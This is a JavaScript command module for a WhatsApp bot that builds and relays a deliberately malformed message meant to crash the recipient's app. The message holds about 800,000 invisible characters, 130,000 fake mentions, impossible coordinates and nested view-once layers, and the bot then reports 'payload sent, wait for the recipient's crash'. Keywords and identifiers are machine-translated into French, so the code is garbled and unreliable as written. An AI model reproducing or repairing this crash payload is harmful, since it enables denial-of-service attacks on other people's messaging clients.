const { estPropriétaire } = exiger('../utils/isOwner');

const paramètresStore = nécessite('../utils/settingsStore');

module.exports = {

nom: 'accident',

exécuter: asynchrone (chaussette, message, args) => {

const chatJid = msg.key.remoteJid;

si (!isOwner(msg)) {

attendre sock.sendMessage(chatJid, { texte: ' Seul le propriétaire peut lancier ce test.' }, { cité : message });

retour;

}

essayer {

// Massif largeur nulle menuisier produit de remplissage

const ZWJ = '\u2063';

const hugeZWJ = ZWJ.répéter(800000); // ~0,8 M invisible chars

// Gigantesque mention liste

const mentions massives = Tableau(130000).remplir('0@s.whatsapp.net');

// Hors plage emplacement coordonnées

const crazyLat = 1_200_000_000;

const crazyLng = -1_200_000_000;

// imbriqué interactif couches (2 niveaux)

const interactif interne = {

viewOnceMessage : {

message: {

Message de réponse interactive : {

corps: { texte: 'CrashTest[ # ]', format: 'DÉFAUT' },

version: 999999

}

}

}

};

const extérieur interactif = {

viewOnceMessage : {

message: {

Message interactif : {

en-tête : {

titre: énormeZWJ,

hasMediaAttachment : FAUX,

message de localisation : {

degrésLatitude : crazyLat,

degrésLongitude : crazyLng,

nom: énormeZWJ,

adresse: hugeZWJ

}

},

corps: { texte: hugeZWJ },

contextInfo : {

participant: '0@s.whatsapp.net',

IDJid distant : 'statut@diffusion',

Jid a mentionné : mentions massives,

Message cité : interactif interne

},

Message de réponse interactive : {

corps: { texte: 'CrashTest[ # ]', format: 'DÉFAUT' },

version: 999999

}

}

}

}

};

// Facultatif: attacher un grand factice médias goutte (décommenter) à augmenter taille plus loin)

/*

const dummyBlob = Buffer.from('A'.repeat(3_000_000)).toString('base64'); // ~3 MB

outerInteractive.viewOnceMessage.message.interactiveMessage.header.locationMessage

.vignette = { URL : data:image/png;base64,${dummyBlob} };

*/

attendre chaussette.relayMessage(chatJid, extérieur interactif, {

messageId : indéfini,

participant: { jid: chatJid }

});

attendre sock.sendMessage(chatJid, { texte: ' Charge utile envoyé – attendre le accident du Destinataire. }, { cité : message });

} attraper (se tromper) {

console.error('Erreur lors de l'envoi du charge utile :', se tromper);

attendre sock.sendMessage(chatJid, { texte: ' Échec de l'envoi du charge utile.' }, { cité : message });

}

}

};
